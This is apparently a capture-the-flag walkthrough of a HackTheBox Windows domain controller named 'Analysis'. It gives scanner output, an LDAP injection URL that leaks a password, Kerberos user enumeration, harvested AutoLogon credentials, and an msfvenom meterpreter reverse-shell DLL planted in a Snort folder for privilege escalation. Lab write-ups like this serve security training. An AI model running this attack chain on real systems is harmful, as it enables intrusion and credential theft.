- LDAP injection with enumration of passwords
- Kerberos bruteforce for users enumeration
- Autologin misconfig and password disclosure
- Dll-Hijacking of Autoloading of Snort 
# 80 - HTTP
```
whatweb http://analysis.htb
http://analysis.htb [200 OK] Country[RESERVED][ZZ], Email[mail@demolink.org,privacy@demolink.org], HTTPServer[Microsoft-IIS/10.0], IP[10.129.40.43], JQuery, Microsoft-IIS[10.0], Script[text/javascript]

Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://analysis.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 162] [--> http://analysis.htb/images/]
/Images               (Status: 301) [Size: 162] [--> http://analysis.htb/Images/]
/css                  (Status: 301) [Size: 159] [--> http://analysis.htb/css/]
/js                   (Status: 301) [Size: 158] [--> http://analysis.htb/js/]
/IMAGES               (Status: 301) [Size: 162] [--> http://analysis.htb/IMAGES/]
/CSS                  (Status: 301) [Size: 159] [--> http://analysis.htb/CSS/]
/JS                   (Status: 301) [Size: 158] [--> http://analysis.htb/JS/]
/bat                  (Status: 301) [Size: 159] [--> http://analysis.htb/bat/]
/Bat                  (Status: 301) [Size: 159] [--> http://analysis.htb/Bat/]


gobuster dir  --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.analysis.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/users                (Status: 301) [Size: 170] [--> http://internal.analysis.htb/users/]
/dashboard            (Status: 301) [Size: 174] [--> http://internal.analysis.htb/dashboard/]
/Users                (Status: 301) [Size: 170] [--> http://internal.analysis.htb/Users/]
/employees            (Status: 301) [Size: 174] [--> http://internal.analysis.htb/employees/]

http://internal.analysis.htb/users/list.php?name=technician)(description=*


gobuster dir -u http://internal.analysis.htb/dashboard -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --follow-redirect --add-slash -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.analysis.htb/dashboard
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Add Slash:               true
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img/                 (Status: 403) [Size: 1268]
/index.php/           (Status: 200) [Size: 38]
/uploads/             (Status: 403) [Size: 1268]
/upload.php/          (Status: 200) [Size: 0]
/details.php/         (Status: 200) [Size: 35]
/css/                 (Status: 403) [Size: 1268]
/Index.php/           (Status: 200) [Size: 38]
/lib/                 (Status: 403) [Size: 1268]
/form.php/            (Status: 200) [Size: 35]
/js/                  (Status: 403) [Size: 1268]
/tickets.php/         (Status: 200) [Size: 35]
/emergency.php/       (Status: 200) [Size: 35]
/IMG/                 (Status: 403) [Size: 1268]
/INDEX.php/           (Status: 200) [Size: 38]
/Details.php/         (Status: 200) [Size: 35]
/Form.php/            (Status: 200) [Size: 35]
/CSS/                 (Status: 403) [Size: 1268]
/Img/                 (Status: 403) [Size: 1268]
/JS/                  (Status: 403) [Size: 1268]
/Upload.php/          (Status: 200) [Size: 0]
/Uploads/             (Status: 403) [Size: 1268]
/Lib/                 (Status: 403) [Size: 1268]
/Tickets.php/         (Status: 200) [Size: 35]
```

Running characters trough * can find the password! LDAP injection
```
http://internal.analysis.htb/users/list.php?name=technician)(description=*
technician@analysis.htb:97NTtl*4QP96Bv
```

# 88 - Kerberos
```
~/go/bin/kerbrute userenum -d analysis.htb --dc $RHOST /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 01/21/24 - Ronnie Flathers @ropnop

2024/01/21 15:27:22 >  Using KDC(s):
2024/01/21 15:27:22 >   10.129.40.43:88

[+] VALID USERNAME: jdoe@analysis.htb
[+] VALID USERNAME: ajohnson@analysis.htb
[+] VALID USERNAME: cwilliams@analysis.htb  
[+] VALID USERNAME: wsmith@analysis.htb  
[+] VALID USERNAME: jangel@analysis.htb  
[+] VALID USERNAME: technician@analysis.htb
```
# 389 - LDAP
```
ldapsearch -H ldap://analysis.htb:389/ -x -s base -b '' "(objectClass=*)" "*" +
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectClass=*)
# requesting: * +
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=analysis,DC=htb
ldapServiceName: analysis.htb:dc-analysis$@ANALYSIS.HTB
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=analysis,DC=htb
serverName: CN=DC-ANALYSIS,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=C
 onfiguration,DC=analysis,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=analysis,DC=htb
namingContexts: DC=analysis,DC=htb
namingContexts: CN=Configuration,DC=analysis,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=analysis,DC=htb
namingContexts: DC=DomainDnsZones,DC=analysis,DC=htb
namingContexts: DC=ForestDnsZones,DC=analysis,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 377046
dsServiceName: CN=NTDS Settings,CN=DC-ANALYSIS,CN=Servers,CN=Default-First-Sit
 e-Name,CN=Sites,CN=Configuration,DC=analysis,DC=htb
dnsHostName: DC-ANALYSIS.analysis.htb
defaultNamingContext: DC=analysis,DC=htb
currentTime: 20240121133544.0Z
configurationNamingContext: CN=Configuration,DC=analysis,DC=htb


```

# 3307 - MySQL
```
mariadb -h 10.129.40.43
ERROR 1130 (HY000): Host '10.10.16.54' is not allowed to connect to this MySQL server
```

# 135 - RPC
```
use auxiliary/scanner/dcerpc/endpoint_mapper
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 PIPE (\pipe\lsass) \\DC-ANALYSIS
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (audit)
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (securityevent)
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (LSARPC_ENDPOINT)
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (lsacap)
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (LSA_EAS_ENDPOINT)
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (lsapolicylookup)
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (lsasspirpc)
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (protected_storage)
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (SidKey Local End Point)
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (samss lpc)
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b)
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 TCP (49667) 10.129.40.43
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (OLE62F42D191EA799C7B9C8DE39CFA2)
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 LRPC (NTDS_LPC)
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 HTTP (49670) 10.129.40.43
[*] 10.129.40.43:135      - 12345778-1234-abcd-ef00-0123456789ab v0.0 PIPE (\pipe\ee0bd466358cd060) \\DC-ANALYSIS
# \pipe\atsvc Task scheduler, used to remotely execute commands
[*] 10.129.40.43:135      - 1ff70682-0a51-30e8-076d-740be8cee98b v1.0 LRPC (LRPC-35366947e055c47381)
[*] 10.129.40.43:135      - 1ff70682-0a51-30e8-076d-740be8cee98b v1.0 PIPE (\PIPE\atsvc) \\DC-ANALYSIS
```

# Foothold
Using credential found from interna.analysis.htb I've uploaded windows reverse shell php payload and was able to obtain initial access:
```r
systeminfo

Nom de l'hte:                              DC-ANALYSIS
Nom du systme d'exploitation:              Microsoft Windows Server 2019 Standard
Version du systme:                         10.0.17763 N/A version 17763
Fabricant du systme d'exploitation:        Microsoft Corporation
Configuration du systme d'exploitation:    Contrleur principal de domaine
Type de version du systme d'exploitation:  Multiprocessor Free
Propritaire enregistr:                    Utilisateur Windows
Organisation enregistre:
Identificateur de produit:                  00429-00521-62775-AA748
Date d'installation originale:              07/05/2023, 20:43:36
Heure de dmarrage du systme:              21/01/2024, 14:07:58
Fabricant du systme:                       VMware, Inc.
Modle du systme:                          VMware7,1
Type du systme:                            x64-based PC
Processeur(s):                              2 processeur(s) install(s).
                                            [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 MHz
                                            [02]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 MHz
Version du BIOS:                            VMware, Inc. VMW71.00V.21100432.B64.2301110304, 11/01/2023
Rpertoire Windows:                         C:\Windows
Rpertoire systme:                         C:\Windows\system32
Priphrique d'amorage:                    \Device\HarddiskVolume2
Option rgionale du systme:                fr;Franais (France)
Paramtres rgionaux d'entre:              en-us;Anglais (tats-Unis)
Fuseau horaire:                             (UTC+01:00) Bruxelles, Copenhague, Madrid, Paris
Mmoire physique totale:                    4095 Mo
Mmoire physique disponible:                2260 Mo
Mmoire virtuelle: taille maximale:        4799 Mo
Mmoire virtuelle: disponible:             2671 Mo
Mmoire virtuelle: en cours d'utilisation: 2128 Mo
Emplacements des fichiers d'change:        C:\pagefile.sys
Domaine:                                    analysis.htb
Serveur d'ouverture de session:             N/A
Correctif(s):                               N/A
Carte(s) rseau:                            1 carte(s) rseau installe(s).
                                            [01]: Adaptateur Ethernet vmxnet3
                                                  Nom de la connexion: Ethernet0 2
                                                  DHCP activ:         Oui
                                                  Serveur DHCP:        10.129.0.1
                                                  Adresse(s) IP
                                                  [01]: 10.129.40.43
Configuration requise pour Hyper-V:         Un hyperviseur a t dtect. Les fonctionnalits ncessaires  Hyper-V ne seront pas affiches.

```

# Lateral Movement

Winpeas results highlights:
```
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  analysis.htb.
    DefaultUserName               :  jdoe
    DefaultPassword               :  7y4Z4^*y9Zzj

    Snort(Snort)[C:\Snort\bin\snort.exe /SERVICE] - Autoload - No quotes and Space detected
    Possible DLL Hijacking in binary folder: C:\Snort\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])

```
- credential works for winrm

# Privilege Escalation
Previously detected Snort misconfig with Autoload is the correct Attack Vector
http://hyp3rlinx.altervista.org/advisories/SNORT-DLL-HIJACK.txt
Using Metasploit Framework the escalation is ridiculously easy:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll LHOST=10.10.14.X LPORT=X > tcapi.dll

upload tcapi.dll to C:\Snort\lib\snort_dynamicpreprocessor\ with evil-winrm upload command (or curl.exe is installed on the machine)

msfconsole multi/handler lhost lport same ip and port, architecture is x64
run
```

After 3 minutes of waiting for the Autoload the reverse shell was activated.